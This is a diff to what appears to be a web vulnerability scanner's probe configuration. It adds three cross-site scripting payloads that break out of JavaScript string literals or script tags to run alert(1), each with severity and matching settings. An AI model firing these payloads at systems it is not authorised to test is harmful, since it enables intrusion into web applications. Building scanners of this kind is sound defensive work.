@@ -112,6 +112,43 @@
         }
       ]
     },
+    "javascript_context": {
+      "description": "XSS probes for injection inside existing <script> blocks — breaks out of string literals or script tags to execute attacker-controlled JavaScript",
+      "tech_match": [],
+      "param_match": ["callback", "jsonp", "cb", "name", "user", "value"],
+      "probes": [
+        {
+          "payload": "\";alert(1)//",
+          "description": "Double-quote string breakout inside script block — closes string, injects alert, comments out rest of line",
+          "matchers": [
+            {"type": "reflection", "check_variants": true}
+          ],
+          "severity": "high",
+          "confidence_boost": 55,
+          "variables": {}
+        },
+        {
+          "payload": "'-alert(1)-'",
+          "description": "Single-quote string breakout with arithmetic context — subtraction operator forces alert execution as expression",
+          "matchers": [
+            {"type": "reflection", "check_variants": true}
+          ],
+          "severity": "high",
+          "confidence_boost": 55,
+          "variables": {}
+        },
+        {
+          "payload": "</script><script>alert(1)</script>",
+          "description": "Script tag breakout — closes existing script block and opens a new one with attacker-controlled code",
+          "matchers": [
+            {"type": "reflection", "check_variants": true}
+          ],
+          "severity": "high",
+          "confidence_boost": 60,
+          "variables": {}
+        }
+      ]
+    },
     "dom_based": {
       "description": "DOM XSS probes targeting client-side sinks — javascript: href injection, img onerror, and Angular constructor chain",
       "tech_match": [],
